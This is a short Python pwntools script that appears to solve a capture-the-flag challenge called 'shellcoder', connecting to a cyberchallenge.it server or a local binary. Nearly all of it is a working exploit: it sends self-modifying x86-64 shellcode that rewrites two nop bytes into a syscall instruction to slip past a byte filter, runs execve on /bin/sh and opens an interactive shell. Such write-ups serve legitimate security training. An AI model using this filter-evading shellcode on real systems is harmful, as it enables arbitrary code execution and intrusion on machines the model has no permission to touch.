#!/usr/bin/env python3

from pwn import *

exe = ELF("./shellcoder")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("shellcoder.challs.cyberchallenge.it", 38201)

    return r


def main():
    r = conn()

    shellcode = asm("""
                    mov rax, 0x3b;
                    lea rdi, qword ptr [rip + bin_sh];
                    mov rsi, 0;
                    mov rdx, 0;
                    sub byte ptr [rip + syscall], 0x81;
                    sub byte ptr [rip + syscall + 1], 0x8b;

                syscall:
                    nop;
                    nop;

                bin_sh:
                    .asciz "/bin/sh"
                """)

    r.sendlineafter(b"How many bytes?", f"{len(shellcode)}".encode("ascii"))
    r.sendlineafter(b"Shellcode:", shellcode)

    r.interactive("$ ")


if __name__ == "__main__":
    main()
